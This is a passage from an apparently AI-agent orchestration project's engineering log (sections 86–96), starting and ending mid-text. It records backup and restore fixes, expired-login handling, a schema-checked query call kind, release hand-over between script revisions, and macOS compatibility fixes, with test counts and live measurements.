tree has. commands.md and concepts.md: the panel starts and resumes nothing (#24). concepts.md:
trading and devflow are declared, not carried; `stack/steps/` has admit_models, broker_dispatch
and step as well. packages.md: `approvals` is a capability like the other four; the broker's
address is `settings.url("broker", "url")`, not `runtime()["broker"]` (the generated file has no
such key); `requires.principals` / `host_paths` are present tense; the `egress:` key is read and
run, deprecated for packages, not retired. containers.md: the broker, the per-profile runners and
proxies. commands.md: every flag the scripts take, `cleanup.sh` is a preview without `--apply`,
`credentials.sh`, `admission.py` as the router's door, `packages.py`'s six other subcommands.
update-day.md: `drift.sh` is a person's, the runner's registry access is not worth reading.
install.md: the check reports every miss and pulls `alpine`.

**Measured.** On this checkout (no Docker): review_controls 189/189, doc_examples 10/10,
fanout 8/8, cleanup 17/17, `verify.sh --level static` 13/13; pin_kinds review 51, trial 167,
both at their ratchets. trial_controls is the container's: with `/work` linked to the tree it
runs its first groups and stops at the broker group (a live broker, by design); of what ran,
one check failed for the host's reason (no generated profiles), identically on the code before
this change. The text pins trial_controls holds on the files changed here (`cycle.py`'s lock and
exit code, `soak.sh`'s no-cleanup, `up.sh`'s role block and recreate, the Dockerfile's sudoers)
were read against the new text and hold; the suite itself runs on the cold start. What waits on
the live instance: a `--check` under a running call (the proxy stays up), a backup and a
`--verify-only` restore, one cycle with a misnamed workflow (exit 3, a `refused` row). **Cold-start run 88 green** on 57e0458: the stack
level 24/24, trial_controls 507/507 in the container, review_controls 189/189, hello-lane, the
first-use cycle and the child run to completion; the image built with an empty `docker/ca/`.

**Measured on the live instance (the operator, 2026-10-04, logs in `evidence/m86-*` there).**
The three measurements §86 left open, and what each one found:

| | |
|---|---|
| `release.sh update --to cebf296` | ALL CHECKS PASSED. Before it, the host's root was copied to the untracked name `docker/ca/host-root.crt` (the original kept outside the tree): the update removes the tracked file with the revision, and this host's Kaspersky does intercept the containers' TLS, so without the copy the build's `curl` fails. After it the file is in the live image (`/usr/local/share/ca-certificates/host/host-root.crt`) and no `cand-` image is left — #47, measured |
| `scripts/backup.sh` | **exit 1: "required members missing: docker/preloop-owner.env"**. The live Preloop was claimed on 2026-09-20, before `up.sh` wrote that file; it does not exist there and nothing can mint the password after the fact. `--allow-missing`: exit 0, 16 members, 986 MB. Fixed below |
| `scripts/restore.sh --verify-only` | exit 0 — 17 members unpacked, manifest 16 members, all match, taken from cebf296. It demanded `--workspace` and was given a scratch path; it writes nothing. Fixed below |
| `up.sh --check` under a run | novel-a held before any model call (`claude stale: 37525s`, #44 again), so `auto`, which routes to codex: `--check` started at 09:39:38 while `execute` was calling the model, ALL CHECKS PASSED at 09:39:49; the five egress containers kept their start times, restart count 0; the run went on to `completed_ok: true`, PASS. **`--check` does not restart the proxy** |

**Fixed from it.** `preloop-owner.env` is not a required member: an instance claimed before the
file existed cannot have one, the dump carries the user with its hash, and the password is the
operator's to write into the file (the backup says so, with the keys). `restore.sh --verify-only`
takes the archive and the key and nothing else. The stale claude reading is #44, unchanged.

**Measured again on 5e4143c (the operator).** `scripts/backup.sh` with no flag: exit 0, 16 members,
986 MB, the owner file reported absent with the keys to write. `restore.sh --archive … --verify-only`
with no `--workspace`: **exit 1, `cygpath: can't convert empty path`** — Git Bash's cygpath refuses
an empty argument, `u ""` called it, and `set -e` ended the script; Linux has no cygpath and the
cold start never sees it. The two helpers return an empty path unchanged now, in backup.sh,
restore.sh and release.sh alike (backup.sh had the same call for an instance with no `/research`
mount). Measured on e9265eb by the operator: `--verify-only` with no `--workspace`, exit 0.

## 87. The devflow author's findings, triaged (#51–#56, 2026-10-04)

Six findings came back through the package-feedback template on the day §85 asked for them
(agent-stack-devflow 36b388d on c872360). Each was read against the code and taken as the page
says: a sentence worked out from the source is the page's defect; a thing built around is the
stack's. Five were the stack's, one the page's.

| # | the finding | what changed |
|---|---|---|
| #51 | `roles.py` reads only `route.py`'s `decision.json` and binds only the profile's `candidates`; a round admitted by `admit_models.py` (which writes `admission.json`, and may name a provider the profile does not list) cannot be bound | `roles.py` reads either file; a provider outside the candidates binds when this run's admission named it eligible — login and route from the profile's tables when it has them, the provider's name and the direct route otherwise; one nobody asked about is still "not in the profile" |
| #52 | `step.main` writes the crash under `reason` only; devflow answers machinery failures under `error`, and `reason` means why a task waits | `step.main(fn, failure_key="error", **shape)`; `reason` stays the default |
| #53 | `requires.state` takes one value, and devflow keeps both: a cache here and the task's state on its issue | `state: {here: true, with_the_work: "…"}` (or `[true, "…"]`); `packages.py state` reports both |
| #54 | a package's controls drive its real steps, which reach the roots through the stack's settings, so the controls wrote 821 KB of fixture trees into the instance's `/work/state` | `packages.sh controls` sets `AGENTSTACK_CONTROLS_ROOT` to a temporary directory in the agent for that one process and removes it after; under it `settings.runtime()` moves the three roots a step writes to (workspace, evidence, state) and leaves the rest |
| #55 | `paths` lacks the hand-in root, the configuration root and the hosts of a role's egress profile, so devflow carried `/work/...` defaults | `handoff_root` and `config_root` in `config/environment.yaml` and the defaults; `step.handoff(name)` resolves a hand-in and refuses an escape; `step.egress_hosts(profile)` answers the profile's patterns from the generated list. And `settings.runtime()` fills every section and path key from the defaults, so a `runtime.json` generated before a key still answers for it (the `broker` KeyError of docs/packages.md's old sentence is gone the same way) |
| #56 | no guidance for the printed first-run line of a workflow whose inputs name something real | the page: declare such an input `required: true` with no default; the line carries a quoted placeholder, a person replaces it, and the stack level runs hello-lane's line only |

**Not changed.** Whether `verify --level stack` should run a package's placeholder line (#56): no —
it runs the one workflow whose first run is about nothing in particular. What `admission.json`'s
verdict means for a provider the profile does not list (#51): the profile's thresholds judged it
(`admit_models.py` keeps them, only *who* is asked changes, §61), so binding it is the same
contract the profile's own candidates get.

**Measured.** review_controls 206/206 (a group for #52–#55: the crash key, the four state forms,
the roots filled from the defaults, the controls' scratch root moving three roots and not the
fourth, a hand-in that escapes refused four ways, a profile's hosts answered from the generated
list); doc_examples 10/10; `verify.sh --level static` 13/13; pin_kinds review 51, trial 167, at
their ratchets. `roles.py` against an `admission.json` on this checkout: the codex reviewer bound
on `long-task` (candidates `[claude]`) with login `codex`, route `direct`, its principal carried;
claude's role ineligible with the admission's own words; grok "not in the profile". The same
three cases are in trial_controls' roles group, run by the cold start: **run 91 green** on 2b37097
(the stack level 24/24, novel's controls through `packages.sh verify` on the scratch root). That
`packages.sh controls` sets the scratch root is measured there.

## 88. The expired login, said as what it is (#44, 2026-10-04)

The condition, measured three times in two days (§73, §84, §86): claude's OAuth token expires,
CodexBar takes no new reading ("CodexBar CLI does not launch Claude to refresh credentials"),
the last good reading kept beside the login (§64) ages past `max_age_s`, and the router calls
claude `stale`. Every run whose roles include claude holds; `claude /route login` still says
true; the panel shows a signed-in provider and a held run. #44 named three candidate fixes and
asked where the fix belongs. Read against the rule: the **reason** is the platform's — a reading
that cannot be refreshed because a person's login died is not the ordinary "stale" (a
collection that has not run), it is a state the stack cannot determine and a duty that is due,
and the stack said neither. Which vendor a role runs on is the workflow's.

**What changed.**
- `collect_obs.py`: when the live reading fails and the kept one stands in, the *kind* of the
  failure travels with it (`live_failed_kind`: `login_expired`, `rate_limited`, `other`), read
  from the vendor's own words.
- `router.py`: a reading older than `max_age_s` behind `login_expired` is `unknown: the login's
  token expired — the last reading is Ns old (> max) and nothing here refreshes it; sign in on
  the panel`, with `login_expired: true` on the row; while the kept reading is still young it
  is used, as before, and the row carries the flag. Any other reason for age is still `stale:`.
  Because it is `unknown:`, the bring-up's "every provider's state is knowable" fails on it and
  `ops_health` reports it as a standing risk, whose remedy (`fix_for`) now says why the login
  check still says true.
- The panel: `/api/accounts` carries `login_expired`, and the 계정 row shows `연결됨 · 토큰 만료`
  beside the provider from the first failed refresh on — before the reading ages out.
- `roles.py`: `author=claude|codex:novel-author` names the workflow's order of vendors for a
  role; the first this run's admission admitted is bound, with the role's principal, and when
  none is, every alternative and its reason are on one line. The order is the workflow's, as
  the profile's candidate order is the caller's (CONTRACT.md); the platform only walks it. No
  in-tree workflow was changed to use it: whether novel-a should write on codex when claude's
  login is dead is novel's judgement, and the default stays "hold".

**Not changed: refreshing the token (candidate 1).** Three ways were read, none taken here. (a)
The stack refreshing the OAuth token itself against the vendor's token endpoint — it would
reimplement the CLI's flow and write into the login store, the one thing the rule forbids a
package and the stack should not do lightly either; fragile against the vendor. (b) A scheduled
`claude` invocation so the CLI refreshes its own token — a model call made for no work, with
cost, and outside the one door. (c) CodexBar's `--source cli` for claude, which may launch the
CLI and so refresh — unmeasured; the one command that settles it, on the live instance when the
token is next expired: `CLAUDE_CONFIG_DIR=/route/claude HTTPS_PROXY=http://egress:8888 codexbar
usage --provider claude --source cli --json`, and whether `/route/claude/.credentials.json`
changed. If it does, the collector can fall back to that source on `login_expired`; if it does
not, (a) is the only automatic answer and the operator decides whether to want it. #44 stays
open on that question.

**Measured.** review_controls 212/212: the collector names the kind (expired, 429) beside the
kept reading; the router uses a young kept reading and flags the dead login, calls an aged-out
one `unknown: … sign in on the panel`, and keeps `stale:` for any other age; the remedy's words.
trial_controls' roles group: the first admitted alternative bound with its principal, none
admitted listed with every reason, unknown vendors still missing — run by the cold start: **run 93
green** on 872b4f3 (the stack level 24/24). `verify.sh --level static` 13/13. What waits on the live instance: the next
expiry, read on the panel (`토큰 만료`) and in `up.sh --check` (`FAIL every provider's state is
knowable … token expired`), and the `--source cli` command above.

**The variant trading measured, and the place it asked for (#44, same day).** On the live
instance the observer said `claude=unknown: Claude OAuth token expired … Run claude login` while a
call with the same credential answered *"Your organization has disabled Claude subscription
access for Claude Code · Use an Anthropic API key instead, or ask your admin"* — the observer's
hint was the wrong prescription, the call's sentence the right one, and nothing fed the second
back to where the first is read. Now: the door (`agent_task.py`) leaves a call the vendor refused
for the account's sake — an organisation setting, a dead login, a key it rejects
(`execution.login_refusal`, by words) — as `<logins_root>/.quota/<provider>-<login>.refused.json`
with its sentence, and takes it back on the next completed call; the collector carries it as
`execution_refusal` when it is newer than the reading; the router holds on it, young reading or
not, as `unknown: the last call was refused for the account's sake — "…" — follow that sentence`,
and `fix_for` says the sentence is the remedy. review_controls 218/218 (the classifier, the note
with a good and a kept reading, an old note not carried, the router's hold and wording), the note
left and cleared by `execution.note_refusal` — the step itself deletes nothing, which the cold
start's trial_controls pins (run 94 red on that, 512/513, before the move). **Cold-start run 95
green** on a118059. Not measured live: the next refusal of that class on the instance. #61 (trading): the one sentence on
docs/packages.md "Controls" — with the controls' root set the three roots are re-mapped whatever a
fixture `runtime.json` says; take the workspace from the step's answer. #62 (trading): the door's
three gaps for a schema-pinned harness — a stdin payload, the vendor's raw envelope, a per-call
schema — are a design question on the adapter's ACP path, which carries none of the CLI's
`--output-format json` envelope; left to the operator with the analysis on the issue.

## 89. The query kind of a call (#62, DECISIONS-2026-10-04, 2026-10-04)

The gap, as the trading author put it (#62) and the decision document measured (§1–§8 there): a
harness that pins a prompt to a schema calls a vendor CLI with `--json-schema` and reads the
CLI's envelope — and the one door (`agent_task.py`) carries none of that: it is a *task* (a prompt
that may use tools and writes an artifact), the prompt is read from a file and `{WS}`-substituted,
and the adapter's ACP path has no vendor-side schema mode (acpx forwards `model`, `allowedTools`,
`maxTurns`, `systemPrompt`, `env`; claude-agent-acp never surfaces `structured_output`; the raw-SDK
bypass leaves no journal). The three vendors' CLI envelopes differ, so the shape could not be
"the CLI's" anyway. The operator chose B: the door gains a second kind of call, and the shape is
the door's, after the call, the same for every vendor.

**What changed.**
- `agent_task.py --query <schema.json>`: a **query**. The payload goes byte for byte (`-` reads
  stdin), no `{WS}`, nothing added; the request carries `kind: query` and `schema_sha256`. The
  schema is read *before* the call and refused at no cost when it is not an object at its root
  or uses a keyword the door's validator does not check (`FAILED`, `attempts: 0`, the keywords
  named) — an answer called valid against a half-read schema is worse than no call. After the
  call: a tool call in the events is `TOOLS_USED` whatever the text; a completed call's text,
  one fence removed, is read as JSON and checked (`stack/query.py`, the subset listed in
  docs/packages.md "A query"); valid → `COMPLETED`, the answer written to the expected file and
  carried as `answer`; invalid → `INVALID_OUTPUT`, every break named by its place, the raw text
  kept as `answer.raw.txt`, and no retry. Retried once, as a task is: a login refresh, and a text
  that is not JSON at all (a cut stream); both attempts' `result` and `events` are kept.
- `run-agent.mjs`: on `kind: query` the session is asked for `allowedTools: []` and `maxTurns: 1`,
  no Preloop MCP server is handed over, and every permission request is refused locally
  (`permissions.refusedLocally`, `denial: query_no_tools`) instead of waiting on an approval
  that cannot be given. Each provider says how it asks for no tools (`queryEnv`): Claude a
  project deny list of every tool by name and `mcp__preloop`; Codex shell off, `web_search:
  "disabled"` (the current top-level key; `features.web_search*` are its deprecated spellings),
  no MCP server; Grok nothing — its posture is the login's. The result shape is unchanged: the
  four recorded runs replay as before.
- `execution.py`: the record gains `kind`, `turns`, `tool_calls`, `server_tool_use`,
  `schema_sha256`, `answer`, and `measurements.model_usage` (the adapter's per-model rows, as
  they came — summed across a retry by concatenation); `contract` is **2**. `tool_calls` is
  counted for a task too, from the adapter's events (`query.tool_counts`: one per `tool_call`
  start, a permission request counted when no event named it).
- The brokered path carries the schema as text (`broker_dispatch.py` → `broker.py` →
  `profile_runner.py`, which writes it back and starts the step with the same `--query`); a
  chain step is a query with `"query": "<schema path>"`; a fan-out member's outcome word for the
  two verdicts is `invalid`, which the default `retry_when` does not retry.
- `AGENTSTACK_ADAPTER` names the adapter by path, so a control can stand a recorded vendor in
  its place and measure the step's own reading of a turn's text and events.
- docs/packages.md "A query" and the `output:` block; CONTRACT.md's retry row narrowed to say
  the two faults; DECISIONS-2026-10-04 §8 is the shape built.

**Not built, on purpose.** No schema is sent to the model — what it is told about the shape is
the payload's. No repair of a broken answer, no search for a brace in prose. No auto refresh of a
login (decision 2). `turns` is 1 by construction (one prompt is one turn over ACP) and is a
record field so a reader of two kinds of record reads one shape, not a measurement.

**Measured.** review_controls 235/235: the fence, the schema subset (type, enum, const, required,
additionalProperties, items by `$ref`, min/max, pattern, anyOf/oneOf/allOf), the unchecked
keywords named at any depth, the tool count on the four recorded runs (claude 2, codex 1, grok
2 and 2, none a web lookup), a web lookup told apart, the record's keys and contract 2, the
adapter's local refusal; provider checks 24/24 (each provider's `queryEnv`; the four runs replay
4/4). trial_controls, the query group (20) with a recorded vendor behind the door: the valid, the
fenced, the invalid (no retry, the breaks by place, the raw text kept, nothing produced), the
tool call (TOOLS_USED, the web one told apart), the non-JSON text (one retry, both attempts
kept, the cost summed), the stdin payload byte for byte, the three refused schemas (no call),
and a task through the same door; the retry group +2 (`invalid` not retried by default, retried
when said). `verify.sh --level static` 13/13. Pins: review 51/51, trial 167/167 at the ratchets.
**Cold-start run 99 green** on 32e79be (run 98 red on one trial pin, the door's literal
`"failure": execution.failure_of(r)`, which the verdict line had reworded; kept).

**Measured live (the two measurements the decision named, 2026-10-04, after the instance moved to
94fc735).** Run from the **agent** container — the one with the provider logins; the admin
container has none, and the first attempt there failed both ways (claude `Authentication
required`, codex `CODEX_HOME points to "/route/codex", but that path does not exist`), which is
what this paragraph said to do before it was measured:

```
printf '%s' '<payload>' | docker exec -i <stack>-agent /opt/venv/bin/python /work/stack/steps/agent_task.py \
  claude direct q1 - q1.json research-default claude "" --query /work/evidence/q89-schema.json
```

and the same with `codex`, a schema requiring `answer` (string) and `confidence` (number) and
nothing else:

| | claude | codex |
|---|---|---|
| status · kind | COMPLETED · query | COMPLETED · query |
| `model_adapter_reported` | `claude-haiku-4-5-20251001,claude-opus-5-5` | `gpt-6.1-sol` |
| `tool_calls` · events' tool_call · permission requests | 0 · 0 · 0 | 0 · 0 · 0 |
| `answer` (schema passed, written to `q1.json`) | `{"answer": "Paris", "confidence": 0.99}` | `{"answer": "Paris", "confidence": 1}` |

Both as the decision wanted: the model reported, no tool call under the ask, so neither
provider's `queryEnv` needs another switch. One thing to carry to trading: **Claude Code reports
two models for one query** — a helper model (haiku) beside the one that answered (opus), each
with its own token row in `measurements.model_usage`. A harness that pins a prompt to a model
reads the rows, not the joined string, and decides which row is the pin. Evidence on the
instance under `evidence/q89*`. Trading was told to start its re-qualification (#62).

## 90. Whose script performs an update (#48, DECISIONS-2026-10-04 decision 3, 2026-10-04)

The fact (#48, §84): `release.sh` copies itself to `/tmp` and runs from the copy, so an update is
always performed by the **workspace's** script — the revision being left — which knows nothing
of what the target changed. When the tools moved to `/opt` (#34) the old script moved the
workspace and then looked for them where they no longer were, leaving new code on old images and
a mislabelled release; the next change of layout would do the same. §84's mitigation printed the
way back after a pre-#34 rollback (`git show <rev>:scripts/release.sh`, `RELEASE_SH_HOME`). The
operator chose the general form: the target revision's script performs the update.

**What changed.** `release.sh update --to X` still does, with the running revision's script, the
two things only it can do safely — build the candidate from X's own Dockerfile, keep the release
in use as the rollback point — and then **hands over** (`hand_over_update`): X's
`scripts/release.sh` is taken with `git show`, run against this workspace with
`RELEASE_SH_PINNED=1 RELEASE_SH_HOME=<workspace> RELEASE_SH_HANDED=<this revision>`, and its
exit code is the update's. Handed over, the target's `cmd_update` skips the build and the record
and goes to `update_move` (checkout, rebuild, `up.sh --recreate`, policy), saying `handed over
by  the script of <rev>`. A target whose script does not know the marker — any revision before
this — would build and record a second time, so it is not handed to: the update goes on in the
workspace's script as before and says `performed by  this workspace's script`. The candidate
worktree and image are cleaned by the script that made them, after the child returns. The trust
model is the one DECISIONS named: "the new one installs", with the cold start and the release
record as the safety net either way.

**Measured.** review_controls, the update group +4, at function level on a throw-away repository
with three revisions (a script that knows the marker, one that does not, none): the hand-over
runs the target's script against this workspace with the handing revision named and keeps its
exit code; the two targets that cannot take a hand-over are not handed to; handed over, the
target's `cmd_update` moves the workspace without building or recording (a `docker` stand-in
that would fail the shell is never called); the target's copy is removed. docs/update-day.md
says who performs the update and what the printed line means; the pre-#34 paragraph now says
the manual command is the same hand-over made by hand from a workspace older than this rule.
`verify.sh --level static` 13/13. **Not measured:** a live update — the cold start has no update
path (DECISIONS decision 3); the next update day is the measurement, read in `update`'s own
`performed by` line and the release record it leaves. The instance's move to 94fc735 (the same
day, `ALL CHECKS PASSED`, rollback point `20261004-071229-6dbbcb7`, no `cand-` image left, the
host's root certificate intact) was performed by the script of 6dbbcb7, which predates this
section and so printed no `performed by` line — as the rule says of a workspace older than it.
The first update *from* 94fc735 or later is the one that measures the hand-over.

**Measured live (the same day): `release.sh update --to 6c354af` from 94fc735**, exit 0,
`ALL CHECKS PASSED`:

```
== candidate 6c354af
== recording release 20261004-071932-94fc735
  performed by     the target revision's scripts/release.sh (6c354af)
  handed over by   the script of 94fc735 (candidate built, release in use kept)
  now at           6c354af
ALL CHECKS PASSED
```

The workspace's script built the candidate and recorded the release in use, then the target's
script moved the workspace, rebuilt and checked. One rollback point recorded, not two; no
`cand-` image left. #48 closed on it.

## 91. The door's options travel with it; `--model` through the broker (#62, 2026-10-04)

**What trading asked, and PR #68.** Re-qualification possible, with one thing missing on the way:
a request-level model pin. `run-agent.mjs` forwarded `req.model` as the session's `model` option
and nothing filled it, so a binding pinned to one model could only refuse a mismatch after paying
for the call — §89's own measurement answered with the login's default, opus, not a pin. Trading's
PR #68 (merged, 36212ba) adds `--model <id>` to `agent_task.py`: the ask lands on the request
(`request.json`, byte for byte), the check stays where it was (`measurements.model_usage` rows;
the helper row allowed). Measured live by its author in the agent container: `--model
claude-sonnet-5` → COMPLETED, turns 1, tool_calls 0, rows `[claude-sonnet-5,
claude-haiku-4-5-20251001]`. Trading then reported its re-qualification complete (d5ff0a5: three
workflows cut over to the door binding from Monday; the pin on the answering model's row;
`door_contract=2` compared with `execution.CONTRACT`).

**What reading #68 found in §89's own code.** `agent_task.py` deleted `--query` (and now
`--model`) from `sys.argv` to read its positionals, and the two re-executions after that — the
broker for a role that declares an egress profile, the role's uid — pass `sys.argv[1:]` on. The
comment said they travel; they did not. Measured here with a recorder standing where the broker
listens: a query for `novel-reviewer` (profile `closed`) reached `broker_dispatch.py` as a task
with `-` for a prompt file and died there, `prompt unreadable: FileNotFoundError`, before any
job was posted. The broker path did not know `--model` at all.

**What changed.**
- `agent_task.py`: `split_options()` parts the options from the positionals and puts them back
  into argv *behind* the positionals; the positionals are read from the parted list, the
  re-executions pass argv as before, and the options arrive. An option without its value is
  refused before anything runs, as before.
- `broker_dispatch.py` carries `model` on the job beside `schema`; `broker.py` passes it,
  bounded; `profile_runner.py` checks its shape (a vendor's model name, not a path) and starts
  the step with the same `--model`.
- docs/packages.md "Where it runs": payload, schema and model travel to the broker.

**Measured.** review_controls 243/243: `split_options` on the full argv, on options standing
where the optional positionals would be, on an option without its value, on none. trial_controls'
query group +4: `--model` on the request with the adapter's word still the adapter's; `--model`
without its id refused; **the brokered door end to end** — `novel-reviewer` with `--query` and
`--model` and a stdin payload is handed to a recorder at the broker's address, and the job
carries the role, the payload, the schema text and the model; the broker's answer is the step's.
The same control on the pre-fix door: no job, `prompt unreadable`. `verify.sh --level static`
13/13; pins at the ratchets; **cold-start run 105 green** on b4af006. **Measured live** (the
novel-v2 author, 2026-10-04, instance at fb8ebc9): two queries as `novelv2-reviewer`
(`egress_profile: closed`, so the door's §54 branch hands it to `broker_dispatch`; the broker's
`/health` shows the role mapped to `closed` and the profile provisioned). The payload survived
(the answer addressed the question, `verdict: PASS`), the schema survived (`kind: query`,
`schema_sha256`, the answer validated and carried as `answer`, `tool_calls: 0`, `turns: 1`), and
the model survived (`--model gpt-6-luna` → `model_adapter_reported: gpt-6-luna`, the row in
`measurements.model_usage`). All three options through the broker hand-over, which is what this
section fixed; the §50 refusal of §95 did not arise, the role being on the profile path alone.

## 92. The tree `install` leaves is one an author can commit on (#70); the schema in the payload (#62, 2026-10-04)

**#70 (trading, measured twice).** `scripts/packages.sh install` fetched the declared ref and
checked out `FETCH_HEAD`, which leaves the package tree detached. The documented author loop —
develop the package on the instance that runs it, commit, `git push origin main`, re-install to
re-lock — then commits on the detached chain: the push sends a stale local `main`, prints
`Everything up-to-date` (success-shaped, nothing pushed), and the next `install` locks the old
remote commit and restores the old tree over the new files. A cutover shipped on old code that
way; only a telemetry field carrying the old binding name gave it away.

**What changed.** `checkout_ref()` in `packages.sh`: a ref that is a branch (the fetch of
`+refs/heads/<ref>:refs/remotes/origin/<ref>` succeeds) is checked out *as that branch*,
fast-forwarded to origin's tip and set to track it; a branch the clone has not got yet is created
there. A local branch that holds commits the remote does not have is never moved: the install
refuses, names both ends (`local main at X, origin/main at Y`), says the two ways out (push them,
or `checkout -B <ref> origin/<ref>` to drop them), locks nothing, and the command exits 1. A ref
that is a tag or a commit is checked out detached, and the lock line says so (`locked — detached
— v1 is a tag or a commit, not a branch`); every lock line now says where the tree is. docs/
packages.md "Where it lives" says all of this.

**#62 (trading's preflight, not a defect).** The door sends the model no schema, by design. A
prompt measured under a vendor's schema mode (`--json-schema`, constrained decoding) and moved as
it is grew keys the schema does not name — a `type` key on every observation — and read
`INVALID_OUTPUT`; with the schema in the payload's output-shape block (trading's
`door-compose-v2`) the same stages passed 12/12. docs/packages.md "A query", the payload bullet,
now says it: such a prompt is not the same prompt until the schema is in the payload.

**Measured.** review_controls 248/248, a new group on `checkout_ref` against a throw-away origin:
the tree #70 measured (detached at A, origin at B) is put back on `main` at B, tracking; a branch
behind is fast-forwarded; a branch ahead is refused with both ends and the two ways out, HEAD
unmoved; a tag is detached and said; a branch the clone lacks is created. `verify.sh --level
static` 13/13; pins at the ratchets (a text pin on the install case was written and taken out
again — the ratchet at 51 holds); **cold-start run 107 green** on 80346fa. Not measured here: the install command end to end, which needs
the agent container for the declaration — the next `scripts/packages.sh install trading` on the
instance measures it, in its `locked — on branch main (tracks origin/main)` line and in
`git -C packages/trading status` showing a branch.

## 93. The second live hand-over, and what the first Mac host found (2026-10-04, evening)

**Measured live (the operator's session, reported on #48): the instance moved 0027352 → a30d1ef.**
Before: `up.sh --check` ALL PASSED, `backup.sh` (1.5 GB), `release.sh record --tag
pre-202610-door`, `drift.sh` (no pin changed). `release.sh update --to a30d1ef` printed
`performed by  the target revision's scripts/release.sh (a30d1ef)` — the hand-over of §90, the
second time, from a workspace that had the rule — and ended ALL CHECKS PASSED, exit 0. With it the
instance carries #68, #69 and #71 before trading's door Day-1 (Tuesday 10/6; Monday is a market
holiday). §92's line, read live: `packages.sh install trading` → `at 06042124, locked — on branch
main (tracks origin/main)`, the tree on `main...origin/main`. §91's brokered query: the chain
`agent_task → broker → probe runner` carried the schema and the model to the end, shown by two
exact refusals — the runner's `invalid expected` on an absolute path (the brokered contract is a
workspace-relative path), then the **§50 guard**: `egress-probe declares egress of its own … the
login 'claude' belongs to uid 1000. Connect a login named for this role`. So this instance has no
provider login owned by an egress role yet, which is a fact about the instance, not a defect; the
final read of that call's `request.json` (`kind: query`, `model`) waits on the owner connecting
one, and trading runs on the direct route, so nothing of its cutover depends on it. Trading after
the update: door DRY_OK, rehearse 36/36, admission 5/5, two launchd slots.

**Two findings for the stack, both fixed here.**
- **verify.sh died under macOS's bash 3.2** at the REPEATABLE scan — a `case` with `)` patterns
  inside `$( )`, a known parse bug of that bash — before the first check ran; the cold start, on
  Linux, cannot see it. The loop is now a function and the substitution calls it; no other
  bash-4-only construct is in `scripts/*.sh` (measured by grep: no `declare -A`, `mapfile`,
  `${x,,}`). Parsed here by bash 5 only at the time; **measured on the Mac the same day**, after
  the update to 7ac3f1a: `/bin/bash` (3.2) `scripts/verify.sh --level static` → 13/13.
- **A trial control expected exactly this repository's two roles** (`novel-author`,
  `novel-reviewer`) among the principals the installed packages name, and failed on an instance
  whose own packages declare more (seven there, trading's included). It now asks that the two
  this repository carries are among them. trial 542/543 on the instance was that one line.

**Not the stack's, noted.** The egress scan's other red line was an instance file — the research
profile's allow list carried six raw hostnames without anchors; anchored at the source and
regenerated, ok. An orphan compose service (`agst-mac-toolsvc`) is the instance's to remove
(`--remove-orphans`).

**Measured.** `verify.sh --level static` 13/13 (the REPEATABLE scan through the function);
trial_controls' template group 26/26 here; pins at the ratchets; **cold-start run 109 green** on
8cc7e38.

## 94. The workspace mount as macOS Docker Desktop names it (PR #73, 2026-10-04)

**Found by the first Mac host while taking #72 live** (the trading author's session, PR #73 — opened
without being asked, taken because it was small and right). `release.sh` reads the agent's `/work`
bind source back from `docker inspect` and compares it with the workspace it runs in
(`require_same_workspace`, so a release never describes a checkout other than the mounted one).
Each Docker Desktop names the host path its own way: Windows as `/run/desktop/mnt/host/c/…` or
`/host_mnt/c/…` (a drive letter), which `norm_host` knew; macOS as `/host_mnt/Users/…` — the
host's absolute path under `/host_mnt`, no drive — which it did not, so every `record`, `update`
and `rollback` on that host was refused (`this script is in /Users/… but agst-mac-agent runs
/host_mnt/Users/…`; measured: `release.sh record --tag pre-pr72`).

**What changed.** One case arm in `norm_host`: `/host_mnt/*` → the prefix stripped, the absolute
path kept; the Windows arm stays first (its `?` takes a one-letter segment only). Here: a review
control runs `norm_host` on the four shapes — the two Windows spellings, the macOS form, a plain
Linux path — so the next host form that appears is one line and one measurement.

**Measured.** review_controls 251/251; `verify.sh --level static` 13/13; pins at the ratchets;
**cold-start run 112 green** on dcee9f8. The Mac host's own measurement (a recorded update through the fixed script) is the operator's,
with the `/bin/bash scripts/verify.sh` run §93 waits on.

## 95. The uid path's refusal said a remedy nobody can perform (2026-10-04, evening)

**What happened.** For §91's last live measurement (a brokered query's `request.json`), the
trading author's session ran a query as `egress-probe`, met the §50 refusal (`the login 'claude'
belongs to uid 1000. Connect a login named for this role`), and went to connect one: `claude
login` ran on the host, the credential landed in the host's `~/.claude`, `/route/egress-probe`
stayed empty, and the guard refused again — rightly, since it reads the login's **owner**, not its
validity. The session's diagnosis of that was exact. What it could not know is that the remedy
sentence pointed nowhere: nothing in the stack makes a login a role owns. The panel's login flow
(`login_helper.py`, driven by the ops API) writes `<logins_root>/<name>` as the agent's own uid
and chowns nothing; `role-exec` runs a step as a role but is not a login flow; the one way is by
hand, inside the container, with a chown to the role's uid — and the vendor's own refresh keeps
the file the role's only because the role ran it.

**Why the measurement picked the one role that hits this.** `egress-probe` is the platform's
probe identity and declares both forms: `egress_profile: probe` (the broker design, §53–§55) and
the deprecated `egress:` hosts (the uid design, §48–§50). So its step goes through the broker and
then, in the profile's runner, takes the uid path with the §50 ownership guard. A role that
declares `egress_profile:` alone — `novel-reviewer`, `closed` — takes the broker only, runs in the
profile's runner as the agent uid, and uses the shared login: the recorded `grok-allow` run is
exactly that, COMPLETED. §91's measurement is one brokered query as such a role; no login to
connect.

**What changed.** The refusal now says the way out that exists: declare `egress_profile:` and drop
`egress:` (the uid path is deprecated, nothing on the panel makes a login a role owns, a brokered
role needs none); the by-hand way for a role that must stay on the uid path. docs/packages.md says
the same where the deprecated key is described. The control that pinned the refusal's remedy pins
the new words (one text pin replaced, none added).

**Not changed.** The guard itself: a role on the uid path without a login it owns is still
refused, and `egress-probe` keeps both declarations — it is the probe of the deprecated
mechanism, named as such by every `principals.py apply`. A login flow that runs as a role is not
built: the path it would serve is the one §51 retired.

**Measured.** `verify.sh --level static` 13/13; pins at the ratchets (51 / 167). The role-egress
group that carries the pin runs only where `up.sh` wrote `/role-egress` — the cold start: **run
115 green** on 37d9a36 (run 114 red on the pin's own needle, which spanned two string literals of
the refusal's source; a pin reads the file, not the string it builds). Live the same day: the
instance moved 837ea2a → 7ac3f1a (the operator had taken #72–#74 live the day before, on a
recorded update of its own), `performed by  the target revision's scripts/release.sh (7ac3f1a)`
— the hand-over's third measurement — ALL CHECKS PASSED; trading's door DRY_OK re-read, Tuesday's
cutover untouched. Recorded by the operator on #48.

## 96. The novel-v2 author's findings (#77–#79), the refresh that clears the hold (#44), and the move (#50) (2026-10-04)

**The move (#50).** novel-v2 at agent-stack-novel `2a19f5a`, `requires.stack.min: 7cdb2e4`;
`packages.sh verify` 112/112, `packages.py stack` ok, state declared; one real run read back
